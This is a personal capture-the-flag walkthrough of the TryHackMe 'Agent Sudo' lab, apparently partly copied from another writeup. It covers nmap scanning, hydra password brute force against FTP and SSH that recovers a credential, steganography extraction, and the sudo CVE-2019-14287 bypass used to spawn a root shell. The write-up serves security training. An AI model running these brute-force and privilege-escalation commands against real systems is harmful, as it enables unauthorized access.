
### NMAP


```
─(root💀kali)-[~/Desktop/THM]
└─# nmap -sT -sV 10.10.27.190    

Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 744.99 seconds
```

### FTP 

- Anonymous login not allowed on ftp

### HTTP

- brute forced using ffuf

```
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://10.10.27.190/FUZZ 
```

found nothing


okay so here after reading the writeup i understood we had to change the header of packet that is

user-agent:C


to get what we want, here we got a message saying that your passwrod is very weak


using this inspiration to brute force attack on ssh and ftp with username C to see what we get


<mark style="background: #BBFABBA6;">HYDRA</mark>


for ftp

┌──(root💀kali)-[/usr/share/wordlists]
└─# hydra -l C -P /usr/share/wordlists/seclists/Passwords/500-worst-passwords.txt 10.10.27.190 ftp

took about 5-10 min

tried the same for ssh

┌──(root💀kali)-[/usr/share/wordlists]
└─# hydra -l C -P /usr/share/wordlists/seclists/Passwords/500-worst-passwords.txt 10.10.27.190 ssh


but got no hit so changed that wordlist

─(root💀kali)-[/usr/share/wordlists]
└─# hydra -l C -P rockyou.txt 10.10.27.190 ftp


tried with rockyou and waited for 10 min but no luck

didnt find anything after waiting for 10 min on both ssh and ftp so went for the writeup

okay my bad i was using username as c instead of chris 


tried this command and got the password

┌──(root💀kali)-[/usr/share/wordlists]
└─# hydra -l chris -P rockyou.txt 10.10.27.190 ftp


[21][ftp] host: 10.10.27.190   login: chris   password: crystal



Found this text in FTP and there were two images


──(root💀kali)-[~/Desktop/THM]
└─# cat To_agentJ.txt 
Dear agent J,

All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.

From,
Agent C



As per write i used strings commands to find a hiddent text field in cutie.jpg

```
To_agentR.txt
```


Now followed the writeup 

```
binwalk -e cutie.png
```



this didnt work for me so i used below command 

┌──(root💀kali)-[~/Desktop/THM]
└─# binwalk -e cutie.png --run-as=root


and got an extracted directory and these files in it


┌──(root💀kali)-[~/Desktop/THM/_cutie.png.extracted]
└─# ls
365  365.zlib  8702.zip  To_agentR.txt                                                         


here To_agentR.txt files was empty

as per the writeup and previous evidences and THM question the main data is in zip file but it has a password


using writeup again - below



But we can get the password by using `zip2john` and then use `john` to crack the hash.

![](https://blog.qz.sg/content/images/2021/10/image-23.png)

U may get errors extracting the files using `unzip` if so, use `7z e <zipfile>`


┌──(root💀kali)-[~/Desktop/THM/_cutie.png.extracted]
└─# 7z e 8702.zip         



After unzippin the file we got this

──(root💀kali)-[~/Desktop/THM/_cutie.png.extracted]
└─# cat To_agentR.txt 
Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

By,
Agent R


<mark style="background: #ADCCFFA6;">Now with no idea went with writeup</mark>


The text in quotes look like what we want but it looks like it is encoded. No worries, [CyberChef](https://gchq.github.io/CyberChef/) to the rescue. You can either search for the decoding method to use manually or leave it to CyberChef, 

CyberChef works like magic and suggests auto decoding using Base64

![](https://blog.qz.sg/content/images/2021/10/image-26.png)

Now we have `Area51` , the only file left seems to be our`jpg` image. 

`steghide` is often used to hide data inside of `jpg` files with a passphrase, maybe that is why one of the questions ask us for the `steg password`.

We can verify if our jpg has something to hide, and indeed it does

![](https://blog.qz.sg/content/images/2021/10/image-29.png)

After extracting it with the password we found.

![](https://blog.qz.sg/content/images/2021/10/image-30.png)

AND BOOM SSH CREDENTIALS!

And the other is an image. We need to find out where is the image from. You can use the command below to download the image from the machine and do a reverse image search on Google so I will leave that to you  
`scp <user@machineip>:Alien_autospy.jpg /localdir/`

## [Task 5] Privilege escalation

We have reached the finale and the most exciting task of all.

We can use the typical commands to check the permissions of our user.

![](https://blog.qz.sg/content/images/2021/10/image-32.png)

Now this is interesting

It looks like our user is not allowed to run `/bin/bash` as `root` since we have a `!root`. However, this looks weird as the first `all` means our user can run `/bin/bash` as any user. This is interesting, perhaps we can find a way to exploit this.

As luck would have it, a google search returns us something we might be able to use to gain root privileges.

![](https://blog.qz.sg/content/images/2021/10/image-33.png)

According to [https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-14287](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-14287)

> __In Sudo before 1.8.28, an attacker with access to a Runas ALL sudoer account can bypass certain policy blacklists and session PAM modules, and can cause incorrect logging, by invoking sudo with a crafted user ID. For example, this allows bypass of !root configuration, and USER= logging, for a `sudo -u \#$((0xffffffff))` command.__

Version 1.8.28 eh.

![](https://blog.qz.sg/content/images/2021/10/image-34.png)

Looks vulnerable

Our `sudo` version is lower than 1.8.28, great, now we can exploit it.

Using the exploit we found, we can indeed spawn a root shell and get our root flag.

![](https://blog.qz.sg/content/images/2021/10/image-35.png)

That's all folks


following the above steps i logged in as root

james@agent-sudo:~$ sudo -u \#$((0xffffffff)) /bin/bash
root@agent-sudo:~# ls
Alien_autospy.jpg  user_flag.txt
root@agent-sudo:~# 


